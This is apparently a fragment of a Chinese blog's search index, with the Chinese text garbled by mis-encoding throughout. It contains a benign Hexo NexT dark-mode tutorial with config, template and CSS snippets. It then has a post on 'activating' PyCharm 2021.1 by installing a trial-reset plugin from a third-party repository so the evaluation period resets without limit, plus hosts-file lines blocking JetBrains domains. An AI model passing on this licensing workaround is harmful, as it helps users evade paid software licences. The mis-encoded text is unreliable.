ç¼ºå°‘åˆ‡æ¢æŒ‰é’®ï¼Œé»˜è®¤æ˜¯æ ¹æ®ç³»ç»Ÿåå¥½ï¼ˆç³»ç»Ÿæ˜¯å¦å¤„äºæš—é»‘æ¨¡å¼ï¼‰æ¥å†³å®šæ˜¯å¦å¯ç”¨ Next 7.x è‡ªåŠ¨æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼è‹¥è¯»è€…ä½¿ç”¨çš„ Next ç‰ˆæœ¬æ˜¯ 7.xï¼Œå»ºè®®ç›´æ¥å®‰è£… hexo-next-darkmode æ’ä»¶æ¥è‡ªåŠ¨æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼ï¼Œå…·ä½“çš„å®‰è£…æ­¥éª¤ä¸ä¸‹é¢è®²è¿°çš„ Next 8.x æ•™ç¨‹ä¸€è‡´ã€‚ Next 8.x è‡ªåŠ¨æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼hexo-next-darkmode æ’ä»¶æ”¯æŒè‡ªåŠ¨æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼ï¼ŒåŒæ—¶æ”¯æŒæš—é»‘æ¨¡å¼ä¸‹çš„ CSS æ ·å¼é«˜åº¦è‡ªå®šä¹‰ï¼Œå…¼å®¹ Next 7.x ä¸ 8.x ç‰ˆæœ¬ã€‚ å®‰è£… Hexo æ’ä»¶å®‰è£… hexo-next-darkmode æ’ä»¶ 1$ npm install hexo-next-darkmode --save é…ç½® Hexo æ’ä»¶åœ¨ Next ä¸»é¢˜çš„ _config.yml é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä»¥ä¸‹å†…å®¹ 1234567891011121314151617# Darkmode JS# For more information: https://github.com/rqh656418510/hexo-next-darkmode, https://github.com/sandoche/Darkmode.jsdarkmode_js: enable: true bottom: '64px' # default: '32px' right: 'unset' # default: '32px' left: '32px' # default: 'unset' time: '0.5s' # default: '0.3s' mixColor: 'transparent' # default: '#fff' backgroundColor: 'transparent' # default: '#fff' buttonColorDark: '#100f2c' # default: '#100f2c' buttonColorLight: '#fff' # default: '#fff' isActivated: false # default false saveInCookies: true # default: true label: 'ğŸŒ“' # default: '' autoMatchOsTheme: true # default: true libUrl: # Set custom library cdn url for Darkmode.js isActivated: trueï¼šé»˜è®¤æ¿€æ´»æš—é»‘ / å¤œé—´æ¨¡å¼ï¼Œè¯·å§‹ç»ˆä¸ saveInCookies: falseã€autoMatchOsTheme: false ä¸€èµ·ä½¿ç”¨ï¼›åŒæ—¶éœ€è¦åœ¨ NexT ä¸»é¢˜çš„ _config.yml é…ç½®æ–‡ä»¶é‡Œè®¾ç½® pjax: trueï¼Œå³å¯ç”¨ Pjaxã€‚ å…³é—­åŸç”Ÿçš„æš—é»‘æ¨¡å¼ç¡®ä¿ Next åŸç”Ÿçš„ darkmode é€‰é¡¹è®¾ç½®ä¸º falseï¼Œåœ¨ Next çš„ _config.yml é…ç½®æ–‡ä»¶ä¸­æ›´æ”¹ä»¥ä¸‹å†…å®¹ï¼š 1darkmode: false æš—é»‘æ¨¡å¼ CSS æ ·å¼è‡ªå®šä¹‰ï¼ˆå¯é€‰ï¼‰æš—é»‘æ¨¡å¼æ¿€æ´»åï¼Œhexo-next-darkmode æ’ä»¶ä¼šå°† darkmode--activated CSS ç±»æ·»åŠ åˆ° body æ ‡ç­¾ï¼Œå¯ä»¥åˆ©ç”¨å®ƒè¦†ç›–æ’ä»¶é»˜è®¤è‡ªå¸¦çš„ CSS æ ·å¼ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æš—é»‘æ¨¡å¼ CSS æ ·å¼çš„é«˜åº¦è‡ªå®šä¹‰ã€‚æ›´å¤šé…ç½®å†…å®¹ä»‹ç»å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œå®ç°åŸç†åˆ†æå¯ä»¥çœ‹è¿™é‡Œã€‚ 12345678910111213141516171819202122232425262728293031323334353637.darkmode--activated { --body-bg-color: #282828; --content-bg-color: #333; --card-bg-color: #555; --text-color: #ccc; --blockquote-color: #bbb; --link-color: #ccc; --link-hover-color: #eee; --brand-color: #ddd; --brand-hover-color: #ddd; --table-row-odd-bg-color: #282828; --table-row-hover-bg-color: #363636; --menu-item-bg-color: #555; --btn-default-bg: #222; --btn-default-color: #ccc; --btn-default-border-color: #555; --btn-default-hover-bg: #666; --btn-default-hover-color: #ccc; --btn-default-hover-border-color: #666; --highlight-background: #282b2e; --highlight-foreground: #a9b7c6; --highlight-gutter-background: #34393d; --highlight-gutter-foreground: #9ca9b6;}.darkmode--activated img { opacity: 0.75;}.darkmode--activated img:hover { opacity: 0.9;}.darkmode--activated code { color: #69dbdc; background: transparent;} é‡æ–°æ„å»ºç”Ÿæˆé™æ€æ–‡ä»¶Hexo é‡æ–°æ„å»ºç”Ÿæˆé™æ€æ–‡ä»¶åï¼Œç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®å³å¯åˆ‡æ¢æš—é»‘æ¨¡å¼ï¼Œæœ€ç»ˆæ¼”ç¤ºæ•ˆæœå¯ä»¥çœ‹è¿™é‡Œã€‚ 123$ hexo clean$ hexo g -d (adsbygoogle = window.adsbygoogle || []).push({}); Next 8.x æ‰‹åŠ¨æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼å…³é—­åŸç”Ÿçš„æš—é»‘æ¨¡å¼ç¡®ä¿ Next åŸç”Ÿçš„ darkmode é€‰é¡¹è®¾ç½®ä¸º falseï¼Œåœ¨ Next çš„ _config.yml é…ç½®æ–‡ä»¶ä¸­æ›´æ”¹ä»¥ä¸‹å†…å®¹ï¼š 1darkmode: false æ·»åŠ  JS åº“ Darkmode.jsä¸‹è½½ darkmode.js æˆ–è€…ç›´æ¥æ·»åŠ  CDN é…ç½®åˆ° Next çš„ themes/next/_vendors.yml æ–‡ä»¶æœ«å°¾ï¼Œè¿™é‡Œé‡‡ç”¨ CDN é…ç½®çš„æ–¹å¼ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ 1234darkmode_js: name: darkmode-js version: 1.5.7 file: lib/darkmode-js.min.js æ·»åŠ  Darkmode.js çš„å¯ç”¨å¼€å…³åœ¨ Next çš„ _config.yml é…ç½®æ–‡ä»¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ç¼©è¿›ï¼Œç¬¬ä¸€ä¸ª darkmode_js æ˜¯åœ¨ vendors æ ç›®ä¸‹ï¼Œç¬¬äºŒä¸ª darkmode_js æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ ç›® 123456vendors: # Darkmode.js darkmode_js:darkmode_js: enable: true é…ç½® JS åº“ Darkmode.jsç¼–è¾‘ themes/next/layout/_scripts/vendors.njk æ–‡ä»¶ï¼Œå°†åŸæœ‰çš„ä»£ç åˆ é™¤æ‰ï¼Œæ›¿æ¢ä¸ºä»¥ä¸‹ä»£ç å³å¯ï¼š 123456789101112131415161718192021222324252627282930313233{%- if theme.canvas_ribbon.enable %} &lt;script size=\"{{ theme.canvas_ribbon.size }}\" alpha=\"{{ theme.canvas_ribbon.alpha }}\" zIndex=\"{{ theme.canvas_ribbon.zIndex }}\" src=\"{{ theme.vendors.canvas_ribbon }}\"&gt;&lt;/script&gt;{%- endif %}{# Customize darkmode.js - Declaration #}{%- if theme.darkmode_js.enable %} &lt;script src=\"{{ theme.vendors.darkmode_js }}\"&gt;&lt;/script&gt;{%- endif %}{%- for name in js_vendors() %} &lt;script src=\"{{ url_for(theme.vendors[name]) }}\"&gt;&lt;/script&gt;{%- endfor %}{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: 'unset', // default: '32px' left: '32px', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: '#fff', // default: '#fff' backgroundColor: '#fff', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: 'ğŸŒ“', // default: '' autoMatchOsTheme: true // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} æ›´æ”¹åçš„æºæ–‡ä»¶å°±å¦‚ä¸Šæ‰€ç¤ºï¼Œå…¶ä»–å†…å®¹å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè‡ªè¡Œæ›´æ”¹ã€‚æ·»åŠ ä¸Šé¢çš„ä»£ç åï¼Œæš—é»‘æ¨¡å¼çš„åˆ‡æ¢æŒ‰é’®é»˜è®¤æ˜¾ç¤ºåœ¨å·¦ä¸‹è§’ï¼Œå¦‚æœå¸Œæœ›åˆ‡æ¢æŒ‰é’®æ˜¾ç¤ºåœ¨å³ä¸‹è§’ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: '32px', // default: '32px' left: 'unset', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: '#fff', // default: '#fff' backgroundColor: '#fff', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: 'ğŸŒ“', // default: '' autoMatchOsTheme: false // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} æš—é»‘æ¨¡å¼ CSS æ ·å¼è‡ªå®šä¹‰å®ç°åŸç†åˆ†æä» Next 8.0 å¼€å§‹ï¼Œå·²ç»åŸç”Ÿæ”¯æŒä»£ç å— Dark ä¸»é¢˜ï¼Œç›´æ¥åœ¨ Next çš„ _config.xml æ–‡ä»¶é‡Œé…ç½®å³å¯ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼š 123456789codeblock: # Code Highlight theme # All available themes: https://theme-next.js.org/highlight/ theme: light: atelier-forest-light dark: androidstudio prism: light: prism dark: prism-atom-dark å…¶ä¸­ Next 8.3 æºæ–‡ä»¶ themes/next/source/css/_colors.styl çš„å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465:root { --body-bg-color: $body-bg-color; --content-bg-color: $content-bg-color; --card-bg-color: $card-bg-color; --text-color: $text-color; --blockquote-color: $blockquote-color; --link-color: $link-color; --link-hover-color: $link-hover-color; --brand-color: $brand-color; --brand-hover-color: $brand-hover-color; --table-row-odd-bg-color: $table-row-odd-bg-color; --table-row-hover-bg-color: $table-row-hover-bg-color; --menu-item-bg-color: $menu-item-bg-color; --btn-default-bg: $btn-default-bg; --btn-default-color: $btn-default-color; --btn-default-border-color: $btn-default-border-color; --btn-default-hover-bg: $btn-default-hover-bg; --btn-default-hover-color: $btn-default-hover-color; --btn-default-hover-border-color: $btn-default-hover-border-color; --highlight-background: $highlight-background; --highlight-foreground: $highlight-foreground; --highlight-gutter-background: $highlight-gutter-background; --highlight-gutter-foreground: $highlight-gutter-foreground;}if (hexo-config('darkmode')) { @media (prefers-color-scheme: dark) { :root { --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; --highlight-background: $highlight-background-dark; --highlight-foreground: $highlight-foreground-dark; --highlight-gutter-background: $highlight-gutter-background-dark; --highlight-gutter-foreground: $highlight-gutter-foreground-dark; } img { opacity: .75; &amp;:hover { opacity: .9; } } }} æš—é»‘æ¨¡å¼æ¿€æ´»åï¼ŒDarkmode.js é»˜è®¤ä¼šå°† darkmode--activated CSS ç±»æ·»åŠ åˆ° body æ ‡ç­¾ï¼Œå¯ä»¥åˆ©ç”¨å®ƒè¦†ç›–æš—é»‘æ¨¡å¼é»˜è®¤çš„ CSS æ ·å¼ã€‚æ¢å¥è¯è¯´ï¼Œåªè¦å°†ä¸Šé¢çš„ themes/next/source/css/_colors.styl é‡Œçš„ CSS æ ·å¼æ·»åŠ åˆ° darkmode--activated CSS ç±»çš„ä¸‹é¢ï¼Œå°±å¯ä»¥å®ç°æš—é»‘æ¨¡å¼çš„ CSS æ ·å¼è‡ªå®šä¹‰ã€‚ å®ç°æ­¥éª¤ä»‹ç» ç¬¬ä¸€æ­¥ï¼šåˆ›å»º themes/next/source/css/_custom/darkmode.styl æºæ–‡ä»¶ï¼Œå¹¶å°†ä»¥ä¸‹å†…å®¹å†™å…¥åˆ°æ–‡ä»¶é‡Œï¼Œcode æ ·å¼ç”¨äºæ§åˆ¶æš—é»‘æ¨¡å¼ä¸‹çš„ä»£ç å—é¢œè‰²æ˜¾ç¤º 12345678910111213141516171819202122232425262728293031323334353637383940.darkmode--activated{ --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; --highlight-background: $highlight-background-dark; --highlight-foreground: $highlight-foreground-dark; --highlight-gutter-background: $highlight-gutter-background-dark; --highlight-gutter-foreground: $highlight-gutter-foreground-dark; img { opacity: .75; &amp;:hover { opacity: .9; } } code { color: #69dbdc; background: transparent; }} è‹¥æ·»åŠ ä¸Šè¿° CSS æ ·å¼åï¼Œæš—é»‘æ¨¡å¼çš„åˆ‡æ¢æŒ‰é’®ç‚¹å‡»æ— æ•ˆï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è¿½åŠ ä»¥ä¸‹æ ·å¼æ¥è§£å†³ 123button.darkmode-toggle { z-index: 9999;} ç¬¬äºŒæ­¥ï¼šåœ¨ themes/next/source/css/main.styl æ–‡ä»¶é‡Œå¼•å…¥ä¸Šé¢åˆ›å»ºçš„ CSS æ–‡ä»¶å³å¯ 1@import '_custom/darkmode.styl'; ç¬¬ä¸‰æ­¥ï¼šåœ¨ themes/next/layout/_scripts/vendors.njk é‡Œæ›´æ”¹ Darkmode.js çš„é¢œè‰²é…ç½®ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œå…¶ä¸­ä¸»è¦è®¾ç½® mixColor: 'transparent' ä¸ backgroundColor: 'transparent'ï¼Œå¦åˆ™è‡ªå®šä¹‰çš„æš—é»‘æ¨¡å¼ CSS æ ·å¼æ— æ³•è¾¾åˆ°é¢„æœŸçš„æ˜¾ç¤ºæ•ˆæœ 12345678910111213141516171819202122232425{# Customize darkmode.js - Declaration #}{%- if theme.darkmode_js.enable %} &lt;script src=\"{{ theme.vendors.darkmode_js }}\"&gt;&lt;/script&gt;{%- endif %}{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: 'unset', // default: '32px' left: '32px', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: 'transparent', // default: '#fff' backgroundColor: 'transparent', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: 'ğŸŒ“', // default: '' autoMatchOsTheme: true // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} é‡æ–°æ„å»ºç”Ÿæˆé™æ€æ–‡ä»¶Hexo é‡æ–°æ„å»ºç”Ÿæˆé™æ€æ–‡ä»¶åï¼Œç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®å³å¯åˆ‡æ¢æš—é»‘æ¨¡å¼ 123$ hexo clean$ hexo g -d æ”¯æŒè¯„è®ºç³»ç»Ÿçš„æš—é»‘æ¨¡å¼Waline è¯„è®ºç³»ç»Ÿ Waline è¯„è®ºç³»ç»Ÿå¯ç”¨æš—é»‘æ¨¡å¼ æœ€ç»ˆæ¼”ç¤ºæ•ˆæœ å¸¸è§é—®é¢˜è¯„è®ºåŒºç•™è¨€åé¦ˆè‹¥æš—é»‘æ¨¡å¼æ— æ³•ç”Ÿæ•ˆï¼Œä½ å¯ä»¥åœ¨ä¸‹æ–¹çš„è¯„è®ºåŒºç•™è¨€ï¼Œæˆ–è€…åˆ›å»º GitHub Issueã€‚å¸Œæœ›ä½ åœ¨ç•™è¨€çš„æ—¶å€™ï¼Œèƒ½æä¾› NexT ä¸»é¢˜çš„ç‰ˆæœ¬ + åšå®¢é“¾æ¥ï¼Œè¿™æ ·æ–¹ä¾¿åšä¸»è·Ÿè¸ªå¹¶å¸®ä½ è§£å†³é—®é¢˜ã€‚ Darkmode.js è¯¦ç»†é…ç½® Darkmode Github Chrome æ— æ³•æ­£å¸¸æ˜¾ç¤ºåˆ‡æ¢æŒ‰é’®çš„å›¾æ ‡é»˜è®¤çš„åˆ‡æ¢æŒ‰é’®å›¾æ ‡ label: 'ğŸŒ“' æ˜¯ Emoji è¡¨æƒ…å­—ç¬¦ï¼Œéƒ¨åˆ†æµè§ˆå™¨ï¼ˆå¦‚ Chromeï¼‰å¯èƒ½ä¼šæ˜¾ç¤ºä¸ºä¸€ä¸ªæ–¹å—ã€‚è§£å†³æ–¹æ³•æ˜¯è®¿é—® Chrome ç½‘ä¸Šåº”ç”¨å•†åº—ï¼Œæ‰‹åŠ¨å®‰è£… Chromoji æµè§ˆå™¨æ’ä»¶ï¼Œå³å¯è®© Chrome æ­£å¸¸æ˜¾ç¤º Emoji è¡¨æƒ…å­—ç¬¦ã€‚è¯·ç¡®ä¿å¯ä»¥ç§‘å­¦ä¸Šç½‘ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸è®¿é—® Chrome çš„ç½‘ä¸Šåº”ç”¨å•†åº—ã€‚è‹¥æ­¤æ–¹æ³•ä¾æ—§æ— æ³•è§£å†³è¯¥é—®é¢˜ï¼Œè¯·å‚è€ƒä¸‹æ–¹è¯„è®ºåŒºä¸­ç½‘å‹ busyops ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆï¼Œæˆ–åœ¨è¯„è®ºåŒºç•™è¨€ï¼Œç¬”è€…ä¼šåŠæ—¶å›å¤ä½ ã€‚",tags:"é™æ€åšå®¢"},{title:"PyCharm 2021.1 æœ€æ–°ä¸“ä¸šç‰ˆæ¿€æ´»æ•™ç¨‹",url:"/posts/cfba1e15.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äº PyCharm 2021.1 æœ€æ–°ä¸“ä¸šç‰ˆçš„æ¿€æ´»ï¼Œç”±äº PyCharm æ›´æ–°åˆ° 2021.1 ç‰ˆæœ¬åï¼Œä¹‹å‰æ‰€æœ‰çš„æ¿€æ´»æ–¹å¼å¥½åƒéƒ½å¤±æ•ˆäº†ï¼Œæ‰€ä»¥ä»Šå¤©ä»‹ç»ä¸‹æœ€æ–°çš„æ¿€æ´»æ–¹å¼ã€‚è¯¥æ¿€æ´»æ–¹æ³•é€‚ç”¨äº Jetbrains å…¨å®¶æ¡¶ä»»ä½•ç‰ˆæœ¬ï¼Œå³ä½¿æ˜¯ä»å®˜ç½‘ä¸‹è½½çš„æœ€æ–°ç‰ˆæœ¬ï¼Œäº²æµ‹å¯æˆåŠŸæ¿€æ´»ã€‚ èµ„æºä¸‹è½½ Python å®˜ç½‘ä¸‹è½½ PyCharm å®˜ç½‘ä¸‹è½½ Jetbrains æ¿€æ´»æ’ä»¶ä¸‹è½½ï¼ˆæœ¬ç«™ï¼‰ PyCharm æ¿€æ´»æ›´æ”¹ Hosts æ–‡ä»¶æ›´æ”¹ hosts æ–‡ä»¶ï¼Œå°† hosts æ–‡ä»¶ä¸­æœ‰å…³ Jetbrains çš„é…ç½®è¡Œå…¨éƒ¨åˆ é™¤æ‰ï¼Œè‹¥æ²¡æœ‰åˆ™è¯·å¿½ç•¥æ­¤æ­¥éª¤ã€‚Windows ç³»ç»Ÿçš„ hosts æ–‡ä»¶è·¯å¾„ä¸ºï¼šC:\\Windows\\System32\\drivers\\etc\\hostsï¼ŒLinux å’Œ Mac ç³»ç»Ÿçš„ hosts æ–‡ä»¶è·¯å¾„ä¸ºï¼š/etc/hostsï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªéœ€åˆ é™¤ä»¥ä¸‹ä¸¤è¡Œå†…å®¹å³å¯ï¼š 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com PyCharm å®‰è£…ä¸è¯•ç”¨ä¸‹è½½å®‰è£… PyCharmï¼Œç„¶åå¯åŠ¨ PyCharm å¹¶é€‰æ‹©è¯•â½¤ï¼ˆEvaluate for freeï¼‰æ¨¡å¼è¿›â¼Šè½¯ä»¶ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚å‡è®¾è½¯ä»¶ä¹‹å‰æ¿€æ´»è¿‡ä¸”å·²å¤±æ•ˆã€æ­£åœ¨è¯•ç”¨ã€è¯•ç”¨è¿‡ä¸”å·²è¿‡æœŸï¼Œé‚£ä¹ˆå¿…é¡»å…ˆåˆ é™¤ PyCharm çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œç„¶åå†é‡æ–°å¯åŠ¨è½¯ä»¶ï¼ŒPyCharm é…ç½®æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å¦‚ä¸‹ï¼š 1234567# Windowsç³»ç»ŸC:\\Documents and Settings\\Administrator\\.PyCharm2021.1\\configC:\\Documents and Settings\\Administrator\\.PyCharm2021.1\\system# Linux/Macç³»ç»Ÿ~/.config/JetBrains/PyCharm2021.1~/.local/share/JetBrains/PyCharm2021.1 PyCharm åˆ›å»ºæˆ–é€‰æ‹©é¡¹ç›®é€‰æ‹©åˆ›å»ºé¡¹ç›®æˆ–è€…æ‰“å¼€å·²å­˜åœ¨çš„é¡¹ç›® é€‰æ‹©å¥½é¡¹ç›®è·¯å¾„å’Œ Python è§£é‡Šå™¨åï¼Œç‚¹å‡» create æŒ‰é’®åï¼Œè¿›å…¥ Pycharm çš„ä¸»ç•Œé¢ (adsbygoogle = window.adsbygoogle || []).push({}); PyCharm æ¿€æ´»è¿™é‡Œçš„æ¿€æ´»æ–¹å¼å°±æ˜¯é€šè¿‡æ¿€æ´»æ’ä»¶ï¼Œè®© PyCharm å¯ä»¥ä¸€ç›´è¯•ç”¨ï¼Œæœ¬è´¨æ˜¯é‡ç½® PyCharmï¼Œæœ€ç»ˆè¾¾åˆ°æ— é™æ¬¡è¯•ç”¨ 30 å¤©çš„æ•ˆæœã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ­¤æ¿€æ´»æ–¹æ³•ä¼šå½»åº•é‡ç½® PyCharmï¼Œä»»ä½•é…ç½®ä¿¡æ¯éƒ½å°†ä¸¢å¤±ï¼Œå’Œæ–°å®‰è£…çš„æ—¶å€™ä¸€æ ·ã€‚ ç¦»çº¿æ¿€æ´»æ–¹å¼é¦–å…ˆæ‰‹åŠ¨ä¸‹è½½å¥½ PyCharm çš„æ¿€æ´»æ’ä»¶ï¼Œç„¶åå¯åŠ¨ PyCharm åï¼Œèœå•æ å¯¼èˆªåˆ° file -&gt; settings -&gt; Pluginsï¼Œä¾æ¬¡ç‚¹å‡» é½¿è½® -&gt; Install Plugin from Disk...ï¼Œæ‰¾åˆ°æ¿€æ´»æ’ä»¶æ‰€åœ¨ç›®å½•ï¼Œé€‰ä¸­æœ¬åœ°æ¿€æ´»æ–‡ä»¶ ide-eval-resetter-2.1.13.zipï¼Œæœ€åç‚¹å‡» OK æŒ‰é’®å³å¯ åœ¨çº¿æ¿€æ´»æ–¹å¼å¯åŠ¨ PyCharm åï¼Œèœå•æ å¯¼èˆªåˆ° file -&gt; settings -&gt; Pluginsï¼Œä¾æ¬¡ç‚¹å‡» é½¿è½® -&gt; Manage Plugin Repositories...ï¼Œç‚¹å‡» + æ·»åŠ ä»“åº“ URL https://plugins.zhile.ioï¼Œç„¶åç‚¹å‡» OK æŒ‰é’® ç‚¹å‡» Plugins -&gt; Maketplaceï¼Œæœç´¢ IDE Eval Reset æ’ä»¶ï¼Œç„¶åç‚¹å‡» Install æŒ‰é’®è¿›è¡Œå®‰è£…ï¼Œå¦‚æœæœç´¢ä¸åˆ°å¯¹åº”çš„æ’ä»¶ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šç•… PyCharm æ¿€æ´»æ’ä»¶é…ç½®ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨ IDE çª—å£åˆ‡å‡ºå»æˆ–åˆ‡å›æ¥æ—¶ï¼ˆçª—å£å¤±å» / å¾—åˆ°ç„¦ç‚¹ï¼‰ä¼šè§¦å‘äº‹ä»¶ï¼Œæ£€æµ‹æ˜¯å¦é•¿æ—¶é—´ï¼ˆ2 5 å¤©ï¼‰å†…æ²¡æœ‰é‡ç½®ï¼Œç„¶åå‘é€é€šçŸ¥è®©ä½ é€‰æ‹©é‡ç½®ã€‚ä¹Ÿå¯ä»¥æ‰‹åŠ¨å”¤å‡ºæ¿€æ´»æ’ä»¶çš„ä¸»ç•Œé¢ï¼Œæ‰“å¼€ PyCharm çš„ä¸»ç•Œé¢ï¼Œèœå•æ å¯¼èˆªåˆ° Help -&gt; Eval Resetï¼Œå¼¹å‡ºå¦‚ä¸‹æç¤ºæ¡†ï¼Œå…¶ä¸­åŒ…æ‹¬ 2 ä¸ªæŒ‰é’®ï¼Œ1 ä¸ªå‹¾é€‰é¡¹ï¼š Reload æŒ‰é’®ï¼šç”¨æ¥åˆ·æ–°ç•Œé¢ä¸Šçš„æ˜¾ç¤ºä¿¡æ¯ Reset æŒ‰é’®ï¼šç‚¹å‡»ä¼šè¯¢é—®æ˜¯å¦é‡ç½®è¯•ç”¨ä¿¡æ¯å¹¶é‡å¯ IDEã€‚é€‰æ‹© Yes åˆ™æ‰§è¡Œé‡ç½®æ“ä½œå¹¶é‡å¯ IDE ç”Ÿæ•ˆï¼Œé€‰æ‹© No åˆ™ä»€ä¹ˆä¹Ÿä¸åšï¼ˆæ­¤ä¸ºæ‰‹åŠ¨é‡ç½®æ–¹å¼ï¼‰ Auto reset before per restart å‹¾é€‰é¡¹ï¼šå¦‚æœå‹¾é€‰äº†ï¼Œåˆ™è‡ªå‹¾é€‰åæ¯æ¬¡é‡å¯ / é€€å‡º IDE æ—¶ä¼šè‡ªåŠ¨é‡ç½®è¯•ç”¨ä¿¡æ¯ï¼Œæ— éœ€åšé¢å¤–çš„äº‹æƒ…ï¼ˆæ­¤ä¸ºè‡ªåŠ¨é‡ç½®æ–¹å¼ï¼‰ å¸¸è§é—®é¢˜Pycharm æ— é™é‡å¯å¦‚æœ Pycharm æ— é™é‡å¯ï¼Œè¯´æ˜ä¹‹å‰çš„æ¿€æ´»æ’ä»¶ï¼ˆä¾‹å¦‚ BetterInterlliJï¼‰æ²¡æœ‰å¸è½½ï¼Œè¯·å¸è½½å¹²å‡€å†é‡æ–°æ¿€æ´» PyCharm æ¿€æ´»å¤±è´¥å¦‚æœä¹‹å‰åœ¨ hosts ä¸­æ·»åŠ è¿‡ 0.0.0.0 account.JetBrains.com å’Œ 0.0.0.0 www.JetBrains.comï¼Œè¯·åˆ é™¤æ‰å¯¹åº”çš„å†…å®¹å†é‡æ–°æ¿€æ´» å¦‚ä½•æ›´æ–°æ¿€æ´»æ’ä»¶ IDE ä¼šè‡ªè¡Œæ£€æµ‹å…¶è‡ªèº«å’Œæ‰€å®‰è£…æ’ä»¶çš„æ›´æ–°å¹¶ç»™äºˆæç¤ºï¼Œå¦‚æœæœ¬æ’ä»¶æœ‰æ›´æ–°ï¼Œä½ ä¼šæ”¶åˆ°æç¤ºçœ‹åˆ°æ›´æ–°æ—¥å¿—ï¼Œè‡ªè¡Œé€‰æ‹©æ˜¯å¦æ›´æ–° èœå•æ å¯¼èˆªåˆ° Check for Updates...ï¼Œæ‰‹åŠ¨æ£€æµ‹ IDE å’Œæ‰€å®‰è£…æ’ä»¶çš„æ›´æ–°ï¼Œå¦‚æœæœ¬æ’ä»¶æœ‰æ›´æ–°ï¼Œä½ ä¼šæ”¶åˆ°æç¤ºçœ‹åˆ°æ›´æ–°æ—¥å¿—ï¼Œè‡ªè¡Œé€‰æ‹©æ˜¯å¦æ›´æ–° æ’ä»¶æ›´æ–°å¯èƒ½ä¼šéœ€è¦é‡å¯ IDE 